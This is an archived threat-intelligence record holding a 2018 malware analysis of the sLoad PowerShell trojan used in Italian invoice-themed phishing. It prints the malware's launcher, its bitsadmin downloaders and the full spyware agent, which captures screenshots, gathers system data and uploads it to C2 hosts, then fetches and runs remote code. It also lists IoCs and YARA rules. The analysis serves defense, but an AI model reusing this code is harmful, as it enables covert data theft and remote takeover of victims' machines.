{
    "id": "ad84a040-e265-4596-a14d-30875799189f",
    "created_at": "2023-01-12T15:02:16.889443Z",
    "updated_at": "2025-03-27T02:15:55.22799Z",
    "deleted_at": null,
    "sha1_hash": "245904ac174788dd2fe05194cbab6ffa7286b76a",
    "title": "2018-11-27 - The SLoad Powershell Threat is Expanding to Italy",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:12Z",
    "file_modification_date": "2022-05-28T15:43:12Z",
    "file_size": 1078900,
    "plain_text": "# The SLoad Powershell Threat is Expanding to Italy\n\n**[blog.yoroi.company/research/the-sload-powershell-threat-is-expanding-to-italy/](https://blog.yoroi.company/research/the-sload-powershell-threat-is-expanding-to-italy/)**\n\nNovember 27, 2018\n\n11/27/2018\n\n## Introduction\n\n### In the past months CERT-Yoroi observed an emerging attack pattern targeting its constituency. These series of malicious email messages shared common techniques may be likely related to a single threat group starting its operation against the Italian cyber panorama. It is still not clear if these attack attempts may be originated by a well established cyber-crime group modifying its TTP or a completely new one, however CERT-Yoroi is tracking this threat with the internal codename “Sload-ITA” (TH-163) . Other similar operations have also been documented by SANS ICS researchers in the UK on the past May. The malicious campaigns share the same drop schema based on the abuse code- hiding techniques within compressed archives and similar drop-url patterns:\n\n 2018-10-08 - Malspam campaign with the “/AE-9455933DGW-nota-cliente” drop url pattern\n\n 2018-10-09 - Malspam campaign with the “/fattura-per-cliente-QN-OAYSAPV” drop url pattern\n\n 2018-10-15 - Malspam campaign with the “/MA-47462780Y3-documento-cliente” drop url pattern\n Some of the malicious messages have been sent from “PEC” mailboxes\n\n 2018-11-19 - Malspam campaign with the “/documento-aggiornato-novembre- ER16909FP9”\n Also tracked by CERT-PA \n\n\n-----\n\n### The samples recovered during the response operations have been collected and dissected by the Yoroi-Cybaze ZLAB to unveil details of the malicious implant used by these attackers. The following figure summarizes the steps of the sLoad malware infection.\n\n Figure 1. SLoad infection schema\n\n## Technical analysis\n\n### The malicious sample analyzed is a compressed zip archive containing two distinct files:\n\n 1.\n 1. a link pretending to point to a system folder folder, named “invio fattura\n elettronica.lnk”\n\n 1. a hidden JPEG image “image _20181119_100714_40.jpg”, the file is stored with HA\n attributes.\n\n Despite its innocent-looking shape, the LNK file extracted from the archive has been weaponized in a similar way to that one adopted by APT29’s during their latest operations, demonstrating this technique is part of several malicious cyber-arsenal. In fact, when the user double-click on the file a batch script spawns the powershell script below:\n```\nC:\\Windows\\System32\\cmd.exe /C powershell.exe -nop -eP ByPass -win hi\"d\"den -c \"&\n{$9oc=get-childItem -path c:\\users\\* -recurse -force -include documento-aggiornatonovembre-*.zip;$g3u=get-content -LiteralPat $9oc.fullname;$g3u[$g3u.length-1]|iex}\"\n\n```\n\n-----\n\n### The PS script searches for any file matching the pattern documento-aggiornato-novembre- *.zip”: if the file exist, the script extracts a portion of code in its end and subsequently invokes it through “IEX” primitive; we inspected the zip file and recovered this small code section. In the following figure, is possible to see the attended archive content into the pink and yellow selection, the alien code in blue.\n\n Figure 2. Code attached to the Zip Archive\n\n This portion of the file contains a runnable code invoked by the powershell script. This code is able to download other scripts from “firetechnicaladvisor.com” thanks to the abuse of the “bitsadmin.exe” functionality and then stores all these newly downloaded files inside the “%APPDATA%/<UUID>” folder. The following figure shows the folder’s content after the download of the components of the malicious implant:\n\n\n-----\n\n### Figure 3. Components of the malicious implant\n\n The snippet above, instead, shows the code responsible of the download of these parts of malware.\n```\n$env_appData=$env:appdata;\n$cmd='cmd';\n$gen_random_value_name_ps= -join ((65..90) + (97..122) | Get-Random -count 14 | %\n{[char]$_});\n$get_uuid=(Get-WmiObject Win32_computerSystemProduct).UUid;\n$set_hidden='hidden';\n$folder_to_store_file = $env_appData+'\\'+$get_uuid;\n$h=$folder_to_store_file+'\\d'; \n  if(!(test-path $folder_to_store_file)){\n  New-item -itemtype directory -Force -path $folder_to_store_file;\n  };\n$ps_to_download_and_execute='/c echo 1 > '+$h+' & bitsadmin /wrap /transfer\nfredikasledi /download /priority FOReGrOUnd\n\"https://firetechnicaladvisor.com/globa/monu\"\n'+$folder_to_store_file+'\\'+$gen_random_value_name_ps+'.ps1 & del '+$h+' & exit';\nstart-process -wiNdowstyLe $set_hidden $cmd $ps_to_download_and_execute;\n$e=1;\nStart-Sleep -s 6;\n$p2='powe';\nwhile($e -eq 1){\n  if(test-path $h){\n  Start-Sleep -s 3\n  }else{\n  $e=2\n  }\n};\nStart-Sleep -s 7;\n$p1='ell';\n$ps_to_download_and_execute='/c '+$p2+'rsh'+$p1+' -nop -ep bypass -File\n'+$folder_to_store_file+'\\'+$gen_random_value_name_ps+'.ps1 & exit';\nstart-process -wiNdowstyLe $set hidden $cmd $ps to download and execute;\n\n```\n\n-----\n\n### The NxPgKLnYEhMjXT.ps1 script installs the implant into the victim s machine, registering a scheduled task on the system able to ensure the persistence of the infection. Then, it self- deletes.\n\n Figure 4. Malicious implant installer script\n\n After a quick look at the “CxeLtfwc.ps1” script, we also noticed the malware uses the cmdlet “Invoke-Expression“ to load and run another piece of code from “config.ini” file.\n```\nparam ([string]$k = \"\");\n$random_name_of_powershell=Get-Process -name powershell*;\nif ($random_name_of_powershell.length -lt 2){\n  $folder_name = (Get-WmiObject Win32_ComputerSystemProduct).UUID ;\n  $log = $env:APPDATA+\"\\\"+$folder_name;\n  $key=$k -split \",\" ;\n  $Secure= Get-Content $log\"\\config.ini\";\n  $Encrypted= ConvertTo-SecureString $Secure -key $key;\n  $encrypted_string =\n[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Encrypted);\n  $expression_to_execute =\n[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($encrypted_string);\n  Invoke-Expression $expression_to_execute;\n}\n\n The following figures show how this particular piece of code is invoked by other components of the malicious implant: it's possible to notice the script is launched with the input parameter\n(“1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16”), used as cryptographic key to decrypt\n\n the content of the “config.ini”: the real payload of malware.\n\n```\n\n-----\n\n```\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe win hidden ep bypass\nFile C:\\Users\\admin\\AppData\\Roaming\\42082A54-EE38-CA41-8C45-A16336FBCCD9\\CxeLtfwc.ps1\n-k 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n-------------C:\\Users\\admin\\AppData\\Roaming\\42082A54-EE38-CA41-8C45-A16336FBCCD9\\\n<NOME_CASUALE>.vbs\" 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n-------------Dim objWmi, colItems, objItem, strUUID, blnValidUUID,oShell\nSet objWmi = GetObject(\"winmgmts:\\\\\" & \".\" & \"\\root\\cimv2\")\nSet colItems = objWmi.ExecQuery(\"Select * from Win32_ComputerSystemProduct\")\nSet oShell = WScript.CreateObject (\"WScript.Shell\")\noShell.run \"power\"+\"shel\"+\"l.exe -win hi\"+\"dden -ep by\"+\"pass -Fi\"+\"le\nC:\\Users\\admin\\AppData\\Roaming\\42082A54-EE38-CA41-8C45-A16336FBCCD9\\WpaejPkv.ps1 -k\n\"& WScript.Arguments(0),0,True\nSet oShell = Nothing\n\n### Both “config.ini” and “web.ini” files are decrypted and invoked at run time through the following set of system primitives:\n\n 1.\n 1. “ConvertTo-SecureString”,\n\n 1.\n 1. [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Encrypted);\n\n 1. [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($slStr);\n\n The following figure shows a portion of encrypted code of the “config.ini” file, followed by its decrypted code.\n\n```\n\n-----\n\n### Figure 5. Encrypted payload within config.ini\n\n Here the source code of the malicious agent:\n\n\n-----\n\n```\n$runDMC cmd ;\n[email protected](1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16)\n$morty=$env:APPDATA;\nfunction Get-ScreenCapture{\nParam(\n[Parameter()]\n[Alias(\"Path\")]\n[string]$Directory = \".\",\n[Parameter()]\n[ValidateRange(70,100)]\n[int]$Quality,\n[Parameter()]\n[Switch]$AllScreens\n)    \n  Set-StrictMode -Version 2\n  Add-Type -AssemblyName System.Windows.Forms\n  if ($AllScreens){\n   $Capture = [System.Windows.Forms.Screen]::AllScreens\n  }else{\n   $Capture = [System.Windows.Forms.Screen]::PrimaryScreen\n  }\n  foreach ($C in $Capture){\n   $screenCapturePathBase = $path+\"\\ScreenCapture\"\n   $cc = 0\n   while (Test-Path \"${screenCapturePathBase}${cc}.jpg\") {\n     $cc++\n   }\n   $FileName=\"${screenCapturePathBase}${cc}.jpg\"  \n   $Bitmap = New-Object System.Drawing.Bitmap($C.Bounds.Width, $C.Bounds.Height)\n   $G = [System.Drawing.Graphics]::FromImage($Bitmap)\n   $G.CopyFromScreen($C.Bounds.Location, (New-Object System.Drawing.Point(0,0)),\n$C.Bounds.Size)\n   $g.Dispose()\n   $Quality=70;\n   $EncoderParam = [System.Drawing.Imaging.Encoder]::Quality\n   $EncoderParamSet = New-Object System.Drawing.Imaging.EncoderParameters(1)\n   $EncoderParamSet.Param[0] = New-Object\nSystem.Drawing.Imaging.EncoderParameter($EncoderParam, $Quality)\n   $JPGCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |\nWhere{$_.MimeType -eq 'image/jpeg'}\n   $Bitmap.Save($FileName,$JPGCodec, $EncoderParamSet)\n  }\n}\n$productID = (Get-WmiObject Win32_ComputerSystemProduct).UUID ;\n$path = $morty+\"\\\"+$productID;\n$btlog=$path+'\\btc.log'\n$pp=$path+'\\'+$productID;\ntry{ If(test-path $pp\"_0\"){ Remove-Item $pp\"_*\";}}catch{}\n\n```\n\n-----\n\n```\ntry{ If(test path $pp){Remove Item $pp;}}catch{}\n$ldf='/C bitsadmin /reset';  \nstart-process -wiNdowStylE HiDden $runDMC $ldf;\n$Secure= Get-Content $path\"\\web.ini\";\n$Encrypted= ConvertTo-SecureString $Secure -key $key;\n$slStr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Encrypted);\n$rStr = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($slStr);\n$d=$rStr -split \",\"\nFor ($i=0; $i -le $d.Length-1; $i++){\n  if ($d[$i] -match \"http\"){\n   $rp= -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})   \n   $ldf='/C bitsadmin /transfer '+$rp+' /download /priority normal\n\"'+$d[$i]+'/captcha.php?ch=1\" '+$path+'\\'+$productID+'_'+$i;  \n   start-process -wiNdowStylE HiDden $runDMC $ldf;  \n  }\n}\n$e=1;$dd=0;\nwhile($e -eq 1){\n  $ad=2;\n  For ($i=0; $i -le $d.Length-1; $i++){    \n   $pp=$path+'\\'+$productID+'_'+$i;\n   if([System.IO.File]::Exists($pp)){\n     $line=Get-Content $pp\n     if ($line -eq \"sok\"){ $did=$i;}\n     $ad=1;\n   }      \n  }\n  $dd++;\n  if ($dd -gt 60) {\n   $outU=\"\";\n   For ($i=0; $i -le $d.Length-1; $i++){\n     if ($d[$i] -match \"http\"){\n       $l=$d[$i].split(\".\")[0] -replace \"[^0-9]\", '';\n       $p=$d[$i].split(\".\")[1] -replace \"[^A-Z/]\", '';    \n       $n=[int]$l+1;\n       $r1=$l+'.'+$p;\n       if ($n -gt 50){ $n=1;}\n       $r2=[string]$n+'.'+$p;       \n       $outU+=$d[$i]+\",\" -replace $r1, $r2\n     }\n   }\n   $Secure = ConvertTo-SecureString $outU -AsPlainText -Force\n   $Encrypted = ConvertFrom-SecureString -SecureString $Secure -key $key\n   $Encrypted | out-file $path\"\\web.ini\";   \n   stop-process -name powershell*\n  }\n  if ($ad -eq 1){ $e=2;}  \n\n```\n\n-----\n\n```\n  Start Sleep s 3\n}\n$rp= -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})\n$ldf='/C bitsadmin /transfer '+$rp+' /download /priority FOREGROUND\n\"'+$d[$did]+'new/u.jpg\" \"'+$path+'\\web.ini\" & exit ';\n$ldf | out-file $path'\\asd'\nstart-process -wiNdowStylE HiDden $runDMC $ldf;\n$outD=\"\";\n$dd=Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.Description -match\n'Network'} | Select-Object ProviderName,DeviceID;\ntry{ if ($dd ){for ($i=0; $i -le $dd.length; $i++)\n{$outD=$outD+'{'+$dd[$i].DeviceID+''+$dd[$i].ProviderName+'}';}} }catch {}\ntry{ if ($dd -and $outD -eq \"\" )\n{$outD='{'+$dd[$i].DeviceID+''+$dd.ProviderName+'}';}}catch {}\ntry{\n$nw=$path+'\\_nw';\n$nr=$path+'\\_nr';\n$rf='/C net view > '+$nw+' & copy '+$nw+' '+$nr+' & exit';\nstart-process -wiNdowStylE HiDden cmd $rf;  \n$e=1;while($e -eq 1){If(test-path $nr){$e=3;}Start-Sleep -s 3;}\n$l=get-content $nr;\n$gk=$l -match '\\\\';\nif ($gk -and $gk.length -gt 1){ $outD=$outD+'{in network:'+$gk.length+'}'; }\nremove-item $nr }catch{}\n$cp=Get-WmiObject win32_processor | select Name;\ntry{ if ($cp.length -gt 0){ $cpu=$cp[0].Name }else{$cpu=$cp.Name} }catch {}\ntry{$v1=(gwmi win32_operatingsystem).caption }catch {}\ntry{ Remove-Item $path\"\\*.jpg\";}catch{}\ntry{\n  if([System.IO.File]::Exists($path+\"\\f.ini\")){\n   $ci=Get-Content $path\"\\f.ini\";\n  }else{\n   $ci=0;\n   for ($i=0;$i -le 3;$i++){\n     Get-ScreenCapture;\n     Start-Sleep -s 40;\n   }\n   $cit=Get-ChildItem -Path c:\\users -Filter *.ICA -Recurse -ErrorAction\nSilentlyContinue -Force\n   if ($cit){ $ci=1; }  \n   $ci | Out-File $path\"\\f.ini\"\n  }\n}catch{}\n\n```\n\n-----\n\n```\nif (test path $path \\..\\Microsoft\\Outlook\\ ){$ot 1;}else{$ot 0;}\ntry {$lnk=([System.Uri]$d[$did]).Host}catch{}\n$s=0;\nwhile($true){\n  $out=\"\";\n  $tt=Get-Process | Select-Object name\n  for ($i=0; $i -le $tt.length-1; $i++){\n   $out=$out+\"*\"+$tt[$i].Name;\n  }\n  $rp= -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})\n  $ldf='/C bitsadmin /transfer '+$rp+' /download /priority FOREGROUND\n\"'+$d[$did]+'captcha.php?\nlnk='+$lnk+'&s='+$s+'&g=pu&c='+$ci+'&id='+$productID+'&v='+$v1+'&c='+$rp+'&a='+$out+'&\n '+$path+'\\'+$productID+' > '+$btlog+' & exit ';\n  start-process -wiNdowStylE HiDden $runDMC $ldf;\n  Start-Sleep -s 120;\n  $pp=$path+'\\'+$productID;\n  if([System.IO.File]::Exists($pp)){\n   $line=Get-Content $pp;\n   if ($line -match \"run=\"){\n     $u=$line -replace 'run=','';\n     $ldf=\"/C powershell.exe -command iex ((nEw-ObJect ('NEt.WeBclient')).\n('DowNLoAdStrInG').invoKe(('\"+$u+\"')))\";\n     start-process -wiNdowStylE HiDden $runDMC $ldf;  \n   }elseif ($line.length -gt 3){\n     try{ Remove-Item $path\"\\*.jpg\";}catch{}\n     $dPath = [Environment]::GetFolderPath(\"MyDocuments\")\n     $rp= -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})\n     $ldf='/C bitsadmin /transfer '+$rp+' /download /priority FOREGROUND\n'+$line+' '+$path+'\\'+$productID+'_'+$rp+'.txt & Copy /Z\n'+$path+'\\'+$productID+'_'+$rp+'.txt '+$path+'\\'+$productID+'_'+$rp+'_1.txt &\ncertutil -decode '+$path+'\\'+$productID+'_'+$rp+'_1.txt\n'+$dPath+'\\'+$productID+'_'+$rp+'.exe & powershell -command \"start-process\n'+$dPath+'\\'+$productID+'_'+$rp+'.exe\" & bitsadmin /transfer '+$rp+'s /download\n/priority normal \"'+$d[$did]+'gate.php?\nn='+$env:ComputerName+'&ts=1&id='+$productID+'&c='+$rp+'\"\n'+$path+'\\'+$productID+'_'+$rp+'.txt & exit';\n     start-process -wiNdowStylE HiDden $runDMC $ldf;\n     for ($i=0;$i -le 5;$i++){\n       Get-ScreenCapture;\n       Start-Sleep -s 40;\n     }\n     $ldf='/C del '+$path+'\\'+$productID+'_'+$rp+'.txt & del\n'+$path+'\\'+$productID+'_'+$rp+'_1.txt & del '+$dPath+'\\'+$productID+'_'+$rp+'.exe &\nexit';\n     start-process -wiNdowStylE HiDden $runDMC $ldf;\n   }\n  }\n  for ($i=0; $i -le 5; $i++){\n   $scr=$path+\"\\ScreenCapture\"+$i+\".jpg\"\n   if([System.IO.File]::Exists($scr)){\n\n```\n\n-----\n\n```\n     $rur join ((65..90) + (97..122) | Get Random Count 16 | % {[char]$_});  \n     $rf='/C bitsadmin /transfer '+$rur+' /upload /priority FOREGROUND\n\"'+$d[$did]+'p.php?n='+$env:ComputerName+'&id='+$productID+'&i='+$i+'&s='+$rur+'\"\n\"'+$scr+'\" & del \"'+$scr+'\" & exit';\n     start-process -wiNdowStylE HiDden $runDMC $rf;\n   }\n  }\n  if([System.IO.File]::Exists($btlog)){\n   $e=0;\n   foreach($line in Get-Content $btlog -Encoding UTF8) {\n     if ($line -match \"ERROR\"){ $e++; }\n   }\n   if ($e -gt 0 ){\n     $rf='/C bitsadmin /reset & exit';\n     start-process -wiNdowStylE HiDden $runDMC $rf;     \n     stop-process -name powershell*\n   }\n  }\n  Start-Sleep -s 1200;\n  $s++;\n}\n\n### Instead, decrypting the “web.ini” contents reveal the remote addresses of the C2 used by the malicious implant: https://hamofgri.me/images/, https://ljfumm.me/images/\n\n The malicious agent collects information about the victim machine, such as: domain, dns cache, running processes, ip and system architecture. Moreover, it periodically capture screenshots of the current desktop of the victim, searches for the Microsoft Outlook folder and collects information about the presence of “*.ICA“ Citrix files within the user directory. All these information are sent to the command and control destinations. After the submission of the data, it receives further powershell code directly from the attacker. This behavior is characteristic of Trojan/Spyware malware, often used as a bridgehead for the recon of compromised hosts, potentially even during the initial stages of some more complex attacks.\n\n Figure 6. VT score Sload malware component\n\n## Conclusion\n\n```\n\n-----\n\n### The recent sLoad attack waves, reported by third parties security firms and governmental CERTs too, represent an important threat for the Italian landscape due to the well designed phishing email themes and the possibly low rate of detection of the techniques used within the malware implant itself.\n\n It’s still not clear if the group behind these attacks may be a completely new actor in the cyber-crime panorama, however a possible initial malicious operations may have been spotted in the wild on May 2018, targeting the UK users, instead the more recent attack campaigns against Italian users seems to have begun on the past October, indicating an expansion of the group’s malicious activities.\n\n CERT-Yoroi is currently tracking the TH-163 operations within the Italian landscape and the ZLAB team is continuously analyzing its artifacts, malware implants and techniques to ensure protection to our constituency.\n\n## Indicators of Compromise (IoC)\n\n\n-----\n\n### Dropurls:\n https://upabovenewyork[.com/.fatturazione/fattura-per-cliente-QN- OAYSAPV https://sciencefictionforgirls.[com/cience/ionfo upabovenewyork[.com 91.218.127.[180 sciencefictionforgirls[.com 185.17.27[.100 https://rootcellarproductions.[com/documento/AE-9455933DGW-nota- cliente https://peatsenglishcider.[com/seng/ishci rootcellarproductions[.com 91.218.127.[183 peatsenglishcider.[com 185.17.27[.100 https://three-bottles[.com/area-riservata/MA-47462780Y3-documento- cliente https://icodeucode.[com/col/euco three-bottles[.com 91.218.127.[183 firetechnicaladvisor.[com 185.17.27.[108 https://cavintageclothing[.com/update/b746yrthdfb.txt cavintageclothing.[com 185.17.27[.108 bureaucratica[.org 18.13.7[.20\n\n\n-----\n\n### C2 (sload):\n https://balkher.[eu/doc/p2.txt https://balkher.[eu/sload/2.0/hostp1.txt https://balkher[.eu/sload//img.php?ch=1 balkher[.eu 185.197.75[.241 https://perecwarrio[.eu/sload/ perecwarrior[.eu 185.211.246[.50 https://ljfumm[.me/images/gate.php https://hamofgri.[me/images/gate.php https://hamofgri.[me/images/captcha.php?ch=1 https://ljfumm[.me/images/captcha.php?ch=1 ljfumm[.me hamofgri[.me 185.197.75[.10\n\n Persistency:\n %APPDATA%\\<GUID>\n\n\n-----\n\n### Hash:\n b702e8e23165273f8e90615ce4af2f158048bf6b615f545b992fbbb62f7eff27 zip 1cbe16ac066aeac78c2f3e41e2afa3433833bf6f65131bcfbf88db97e9b94efb jpg d8f4ae0477f7e2931e89e4b6d3e78556d3b5765a2c08bc3bdec8c1f6dc0904c0 lnk ed1007884730a664f9cc827fb60924079149a2fec08ca91c2342c368e727c330 zip 3b5b6cd6ecef252624ee3b5c80d27647766527920b76ebc533f9bc336bfe91ad jpg 0a392ded18578069c647383492253f990210b9c9f9293a6ded09eab7e0936562 jpg b19794f283f9c09f997cbfcbec8c30a5e48eb520ee7bcabd0d62c7b527105f42 lnk 3866a58fe3d459173a28bfdee3ec7a90d7551761121fba9eda3685a268cdeda5 ps1 ed99528a9e818fb486e468d9744745fcfd7157cc8e18181dce7404483c12e834 zip 97f9bb29083458c88844a2cecca272a22cac8cf7960b76c3fa46e891eeb18236 lnk 444e29050bbe68484e33f4e30dbe165186f93884e3336643cfb965156141c5ae jpg 6a49ed883ed266682ec275a395e0d7c6489ded6a6d7072e84af696e82f3b49a3 ps1 f94ebce29158af5f4df34e5af428a514faeef20de08418ad0153ad2a9a07cea0 ps1 daadae8672c31474047f21008ec131cf6a102dac7ca8b8c6df89d35bdf2246da vbs ee1dbf76665f5c07ba1c453d1890aa93307f759c5cce6f59f225111509482a64 ps1 062cc76eeb34d1d3bb5467836cd2d33cb973fc0a8129947af074675beb1fbf1f ini df1cb74942fe9d0897431752c2d9717190aa38f79834e22aa885ec8881134505\n\n## Yara Rules\n```\n rule image_20181119_100714_50_jpg{\n   meta:\n    description = \"Yara Rule for Trojan/sLoad\"\n    author = \"Cybaze Zlab_Yoroi\"\n    last_updated = \"2018-11-21\"\n    tlp = \"white\"\n\n```\n\n-----\n\n```\n   category informational \n  strings:\n    $a1 = \"Adobe Photoshop\"\n $a2 = {3A 30 33 3A 32 38}\n $a3 = {FF D8 FF E0}\n $b = {B4 30 B8 B? ?? ?? ?? BA AD E3 ?? ?? C7 7F 84 6A 09 74 9F 75}\n  condition:\n    $a1 and $a2 and $a3 or $b\n}\nrule documento_aggiornato_novembre_ER16909FP9_zip{\n  meta:\n   description = \"Yara Rule for Trojan/sLoad\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2018-11-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n    $a1 = \"https://firetechnicaladvisor.com/\"\n $a2 = {24 34 4D 61 30 58 32 6C 49 7A}\n $a3 = \"image_20181119_100714_40.jpg\"\n $a4 = \"invio fattura elettronica.lnk\"\n $a5 = {2B 27 2E 70 73 31}\n $b = {50 4B}\n  condition:\n    1 of ($a*) and $b\n}\nrule _ini_files{\n  meta:\n   description = \"Yara Rule for Trojan/sLoad\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2018-11-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n  $a1 = \"DkAYQBjADcANAA3ADUAMwBkADAA\"\n $a2 = \"ADMAMgA5AGUAYgA3AGYAM\"\n  condition:\n    $a1 or $a2\n}\nrule invio_fattura_elettronica_lnk{\n  meta:\n   description = \"Yara Rule for Trojan/sLoad\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2018-11-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n    $a1 = {63 00 3A 00 5C 00 75 00 73 00 65 00 72 00 73 00 5C\n00 2A}\n $a2 = {4D 5A 35 10 00 53 79 73 74 65 6D 33 32}\n $b = {4C ??}\n $c = {63 6D 64 2E 65 78 65}\n $d = \"i.e.x.\"\n\n```\n\n-----\n\n```\n   condition:\n     1 of ($a*) and $b and $c and $d\n }\n\n### This blog post was authored by Luigi Martire, Luca Mella of Cybaze-Yoroi Z-LAB\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-27 - The SLoad Powershell Threat is Expanding to Italy.pdf"
    ],
    "report_names": [
        "2018-11-27 - The SLoad Powershell Threat is Expanding to Italy.pdf"
    ],
    "threat_actors": [
        {
            "id": "9be98f84-4a93-41c7-90bd-3ea66ba5bfd7",
            "created_at": "2022-10-25T16:07:24.581954Z",
            "updated_at": "2025-03-27T02:02:10.287921Z",
            "deleted_at": null,
            "main_name": "TA554",
            "aliases": [
                "TH-163"
            ],
            "source_name": "ETDA:TA554",
            "tools": [
                "DarkVNC",
                "Godzilla",
                "Godzilla Loader",
                "Gootkit",
                "Gootloader",
                "Gozi ISFB",
                "ISFB",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Nimnul",
                "Pandemyia",
                "PsiX",
                "PsiXBot",
                "Ramnit",
                "StarsLord",
                "Waldek",
                "Xswkit",
                "sLoad",
                "talalpek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3808e4f-c7fd-4d25-aa84-aacc27061826",
            "created_at": "2023-01-06T13:46:39.316216Z",
            "updated_at": "2025-03-27T02:00:03.049128Z",
            "deleted_at": null,
            "main_name": "TA554",
            "aliases": [
                "TH-163"
            ],
            "source_name": "MISPGALAXY:TA554",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535736,
    "ts_updated_at": 1743041755,
    "ts_creation_date": 1653752592,
    "ts_modification_date": 1653752592,
    "files": {
        "pdf": "https://archive.orkl.eu/245904ac174788dd2fe05194cbab6ffa7286b76a.pdf",
        "text": "https://archive.orkl.eu/245904ac174788dd2fe05194cbab6ffa7286b76a.txt",
        "img": "https://archive.orkl.eu/245904ac174788dd2fe05194cbab6ffa7286b76a.jpg"
    }
}